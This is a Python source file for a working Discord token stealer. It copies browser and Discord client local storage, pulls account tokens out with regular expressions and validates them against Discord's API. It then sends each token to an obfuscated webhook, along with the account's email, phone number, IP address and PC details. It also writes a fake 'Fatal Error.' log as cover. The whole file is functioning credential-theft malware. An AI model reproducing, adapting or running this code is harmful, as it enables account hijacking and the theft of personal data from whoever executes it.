
import os
import re
import shutil
import sqlite3
from sys import exit
from json import loads
from requests import get, post
from random import randint
from shutil import copyfile
from base64 import b64decode

a = [True, False, 'Ng==', 'VmpGYVYySXhWWGROVldoVllUSjRWbFpyV25kVWJIQlhWVzVPYWxadFVsaFhXSEJIWVVaSmQwNVVSbHBXUlRWWVYxWmFTbVZYVmtWWGJHaFhVbGR6ZUZkc1dtRmtNVTVIVTI1V1lWSXpRbE5hVjNoaFpVWmtXR05GY0d0TmJFcDZXV3RhYzFWdFNuSlRhelZWVmtWd1ZGbDZSbXRYUlRGWVQxZDBhVlpYZHpGWGExWnZaREZTV0ZadVRtaGxhMHBXVkZaYVMyUldVbkpXVkZaVFZtdHdXbGxyVlRWV01VcDBZek5rVjFJemFGUlpWekZYVm1zMVZWZHNVbGRTVkZaUlZteG9kMkp0VmtkalJXaE9WbXMxVmxSV1pGTlNNVkY0Vm01a2FFMUVSbGxVTUZKSFZsZEZlRmRzYUZWV1JWcDZWakJWTlZZeFRuSk9WazVwVm10d00xWnRNSGhOUmtwMFZtdGtXR0pyY0ZSWmJYUmhZMVpaZDFaVVJtcFNiVkl3Vkd4V2ExbFhTbFpqUm1SWFRXcEJNVmxXVlhoalZrWlpXa1pXYVZKc2NFMVdiWEJIVkRKT2MxZHVTbWhTYlZKWVZGVmFkMUpzV2tkWGJVWldZWHBXU0ZkclZtdFdWMHBaVld4b1ZWWldTbGhWZWtaWFkyeFdkR1JHVW1sV2JIQkpWakowVjJFeFZYbFdibEpXVjBkU1lWUlhNVEJOTVhCRlUydDBWbUpGU2xaVVZWRjNVRkU5UFE9PQ==', '4c6af020-6810-45d7-9908-f9516097cc7f']
# False
# False
# 9 = OQ==
# https://discord.com/api/webhooks/688467486307647546/eao2eTD8Uuy5BqDFcRv6zQylB2Kt2uyy4AoK17b_Bnt6U2Xtm5q60eQBfzPHQpVRWstL = The second long string
# d4faa66c-bd90-4459-ba52-27b51f3c8201 = d4faa66c-bd90-4459-ba52-27b51f3c8201 

path = os.getenv('APPDATA')
localpath = os.getenv('LOCALAPPDATA')
user = os.getenv('username')
pc_name = os.environ['COMPUTERNAME']
temp_dir = localpath + "\\temp\\"
tokendir = path + "\\Discord\\Local Storage\\leveldb\\"
ptbtokendir = path + "\\discordptb\\Local Storage\\leveldb\\"
canarytokendir = path + "\\discordcanary\\Local Storage\\leveldb\\"
chromedir = localpath + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\"
operadir = path + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\"
vivaldidir = localpath + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\"
yandexdir = localpath + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\"
bravedir = localpath + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\"
firefoxdir = path + "\\Mozilla\\Firefox\\Profiles\\"
pattern = "[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}"
mfa_pattern = "mfa\.[a-zA-Z0-9_-]{84}"
grabbed = {}

if a[0]:
    if os.path.isfile(f"{temp_dir}{a[4]}.log"):
        os.kill(os.getpid(), 15)
if a[1]:
    os.system("taskkill /im Discord.exe /f")
    os.system("taskkill /im DiscordPTB.exe /f")
    os.system("taskkill /im DiscordCanary.exe /f")

if not os.path.isdir(temp_dir+'token\\'):
    os.mkdir(temp_dir+'token\\')

if os.path.isdir(tokendir):
    tokensfound = []
    for root, dirs, files in os.walk(tokendir):
        for file in files:
            if not os.path.isdir(temp_dir+'token\\discord\\'):
                os.mkdir(temp_dir+'token\\discord\\')
            try:
                copyfile(tokendir+file, temp_dir+'token\\discord\\'+file)
            except Exception:
                continue
    for root, dirs, files in os.walk(temp_dir+'token\\discord\\'):
        for file in files:
            with open(temp_dir+'token\\discord\\'+file,  errors='ignore') as handle:
                lines = handle.read()
            tokens = re.findall(pattern, lines)
            for token in tokens:
                try:
                    t = b64decode(token[:24])
                    int(t.decode())
                except Exception:
                    pass
                else:
                    tokensfound.append(token)
            mfatokens = re.findall(mfa_pattern, lines)
            for token in mfatokens:
                tokensfound.append(token)
    grabbed['Discord'] = tokensfound

if os.path.isdir(ptbtokendir):
    tokensfound = []
    for root, dirs, files in os.walk(ptbtokendir):
        for file in files:
            if not os.path.isdir(temp_dir+'token\\ptb\\'):
                os.mkdir(temp_dir+'token\\ptb\\')
            try:
                copyfile(ptbtokendir+file, temp_dir+'token\\ptb\\'+file)
            except Exception:
                continue
    for root, dirs, files in os.walk(temp_dir+'token\\ptb\\'):
        for file in files:
            with open(temp_dir+'token\\ptb\\'+file,  errors='ignore') as handle:
                lines = handle.read()
            tokens = re.findall(pattern, lines)
            for token in tokens:
                try:
                    t = b64decode(token[:24])
                    int(t.decode())
                except Exception:
                    pass
                else:
                    tokensfound.append(token)
            mfatokens = re.findall(mfa_pattern, lines)
            for token in mfatokens:
                tokensfound.append(token)
    grabbed['Discord PTB'] = tokensfound

if os.path.isdir(canarytokendir):
    tokensfound = []
    for root, dirs, files in os.walk(canarytokendir):
        for file in files:
            if not os.path.isdir(temp_dir+'token\\canary\\'):
                os.mkdir(temp_dir+'token\\canary\\')
            try:
                copyfile(canarytokendir+file, temp_dir+'token\\canary\\'+file)
            except Exception:
                continue
    for root, dirs, files in os.walk(temp_dir+'token\\canary\\'):
        for file in files:
            with open(temp_dir+'token\\canary\\'+file,  errors='ignore') as handle:
                lines = handle.read()
            tokens = re.findall(pattern, lines)
            for token in tokens:
                try:
                    t = b64decode(token[:24])
                    int(t.decode())
                except Exception:
                    pass
                else:
                    tokensfound.append(token)
            mfatokens = re.findall(mfa_pattern, lines)
            for token in mfatokens:
                tokensfound.append(token)
    grabbed['Discord Canary'] = tokensfound

if os.path.isdir(chromedir):
    tokensfound = []
    for root, dirs, files in os.walk(chromedir):
        for file in files:
            if not os.path.isdir(temp_dir+'token\\chrome\\'):
                os.mkdir(temp_dir+'token\\chrome\\')
            try:
                copyfile(chromedir+file, temp_dir+'token\\chrome\\'+file)
            except Exception:
                continue
    for root, dirs, files in os.walk(temp_dir+'token\\chrome\\'):
        for file in files:
            with open(temp_dir+'token\\chrome\\'+file,  errors='ignore') as handle:
                lines = handle.read()
            tokens = re.findall(pattern, lines)
            for token in tokens:
                try:
                    t = b64decode(token[:24])
                    int(t.decode())
                except Exception:
                    pass
                else:
                    tokensfound.append(token)
            mfatokens = re.findall(mfa_pattern, lines)
            for token in mfatokens:
                tokensfound.append(token)
    grabbed['Google Chrome'] = tokensfound

if os.path.isdir(operadir):
    tokensfound = []
    for root, dirs, files in os.walk(operadir):
        for file in files:
            if not os.path.isdir(temp_dir+'token\\opera\\'):
                os.mkdir(temp_dir+'token\\opera\\')
            try:
                copyfile(operadir+file, temp_dir+'token\\opera\\'+file)
            except Exception:
                continue
    for root, dirs, files in os.walk(temp_dir+'token\\opera\\'):
        for file in files:
            with open(temp_dir+'token\\opera\\'+file,  errors='ignore') as handle:
                lines = handle.read()
            tokens = re.findall(pattern, lines)
            for token in tokens:
                try:
                    t = b64decode(token[:24])
                    int(t.decode())
                except Exception:
                    pass
                else:
                    tokensfound.append(token)
            mfatokens = re.findall(mfa_pattern, lines)
            for token in mfatokens:
                tokensfound.append(token)
    grabbed['Opera Browser'] = tokensfound

if os.path.isdir(vivaldidir):
    tokensfound = []
    for root, dirs, files in os.walk(vivaldidir):
        for file in files:
            if not os.path.isdir(temp_dir+'token\\vivaldi\\'):
                os.mkdir(temp_dir+'token\\vivaldi\\')
            try:
                copyfile(vivaldidir+file, temp_dir+'token\\vivaldi\\'+file)
            except Exception:
                continue
    for root, dirs, files in os.walk(temp_dir+'token\\vivaldi\\'):
        for file in files:
            with open(temp_dir+'token\\vivaldi\\'+file,  errors='ignore') as handle:
                lines = handle.read()
            tokens = re.findall(pattern, lines)
            for token in tokens:
                try:
                    t = b64decode(token[:24])
                    int(t.decode())
                except Exception:
                    pass
                else:
                    tokensfound.append(token)
            mfatokens = re.findall(mfa_pattern, lines)
            for token in mfatokens:
                tokensfound.append(token)
    grabbed['Vivaldi'] = tokensfound

if os.path.isdir(yandexdir):
    tokensfound = []
    for root, dirs, files in os.walk(yandexdir):
        for file in files:
            if not os.path.isdir(temp_dir+'token\\yandex\\'):
                os.mkdir(temp_dir+'token\\yandex\\')
            try:
                copyfile(yandexdir+file, temp_dir+'token\\yandex\\'+file)
            except Exception:
                continue
    for root, dirs, files in os.walk(temp_dir+'token\\yandex\\'):
        for file in files:
            with open(temp_dir+'token\\yandex\\'+file,  errors='ignore') as handle:
                lines = handle.read()
            tokens = re.findall(pattern, lines)
            for token in tokens:
                try:
                    t = b64decode(token[:24])
                    int(t.decode())
                except Exception:
                    pass
                else:
                    tokensfound.append(token)
            mfatokens = re.findall(mfa_pattern, lines)
            for token in mfatokens:
                tokensfound.append(token)
    grabbed['Yandex Browser'] = tokensfound

if os.path.isdir(bravedir):
    tokensfound = []
    for root, dirs, files in os.walk(bravedir):
        for file in files:
            if not os.path.isdir(temp_dir+'token\\brave\\'):
                os.mkdir(temp_dir+'token\\brave\\')
            try:
                copyfile(bravedir+file, temp_dir+'token\\brave\\'+file)
            except Exception:
                continue
    for root, dirs, files in os.walk(temp_dir+'token\\brave\\'):
        for file in files:
            with open(temp_dir+'token\\brave\\'+file,  errors='ignore') as handle:
                lines = handle.read()
            tokens = re.findall(pattern, lines)
            for token in tokens:
                try:
                    t = b64decode(token[:24])
                    int(t.decode())
                except Exception:
                    pass
                else:
                    tokensfound.append(token)
            mfatokens = re.findall(mfa_pattern, lines)
            for token in mfatokens:
                tokensfound.append(token)
    grabbed['Brave'] = tokensfound

if os.path.isdir(firefoxdir):
    tokensfound = []
    for root, dirs, files in os.walk(firefoxdir):
        for dir in dirs:
            if not ".default" in dir:
                pass
            else:
                if not os.path.isdir(temp_dir+'token\\firefox\\'):
                    os.mkdir(temp_dir+'token\\firefox\\')
                try:
                    copyfile(firefoxdir+dir+'\\'+'webappsstore.sqlite', temp_dir+'token\\firefox\\'+'webappsstore.sqlite')
                    connection = sqlite3.connect(temp_dir+'token\\firefox\\'+'webappsstore.sqlite')
                    cursor = connection.cursor()
                    cursor.execute('SELECT key, value FROM webappsstore2')
                    values = cursor.fetchall()
                    for value in values:
                        if value[0] == "token":
                            token = value[1].replace('"', '')
                            try:
                                t = b64decode(token[:24])
                                int(t.decode())
                            except Exception:
                                pass
                            else:
                                tokensfound.append(token)
                        else:
                            continue
                except Exception:
                    pass
    grabbed['Firefox'] = tokensfound

try:
    shutil.rmtree(temp_dir+'token\\')
except Exception:
    pass
if len(list(grabbed)) == 0:
    exit()
else:
    ip = get('https://api.ipify.org').text
    h = a[3]
    for x in range(int(b64decode(a[2]))):
        h = b64decode(h)

for app in list(grabbed):
    for token in grabbed[app]:
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        src = get('https://canary.discord.com/api/v7/users/@me', headers=headers)
        if src.status_code == 401:
            pass
        else:
            userdata = loads(src.content)
            try:
                userdata['premium_type']
            except Exception:
                dnitro = "None"
            else:
                if userdata['premium_type'] == 1:
                    dnitro = "Nitro Classic"
                elif userdata['premium_type'] == 2:
                    dnitro = "Nitro With Games"
            payload = {
                "username": userdata['username'],
                "avatar_url": f"https://cdn.discordapp.com/avatars/{userdata['id']}/{userdata['avatar']}.jpg",
                "embeds": [
                    {
                        "author": {
                            "name": f"{userdata['username']}#{userdata['discriminator']} - ({userdata['id']})",
                            "url": None,
                            "icon_url": f"https://cdn.discordapp.com/avatars/{userdata['id']}/{userdata['avatar']}.jpg"
                          },
                        "title": "Token:",
                        "description": token,
                        "color": randint(1, 16777215),
                        "fields": [
                            {
                                "name": "User Info",
                                "value": f"IP: {str(ip)}\nEmail: {userdata['email']}\nPhone: {userdata['phone']}\nNitro Type: {dnitro}\nVerified: {userdata['verified']}\nLangage Account: {userdata['locale']}",
                                "inline": "true"
                            },
                            {
                                "name": "PC Info",
                                "value": f"Username: {user}\nPC Name: {pc_name}\nToken Location: {app}",
                                "inline": "true"
                            }
                        ]
                    }
                ]
            }
            post(h, json=payload)

if a[0]:
    with open(f"{temp_dir}{a[4]}.log", 'w+') as handle:
        handle.write("Fatal Error.")
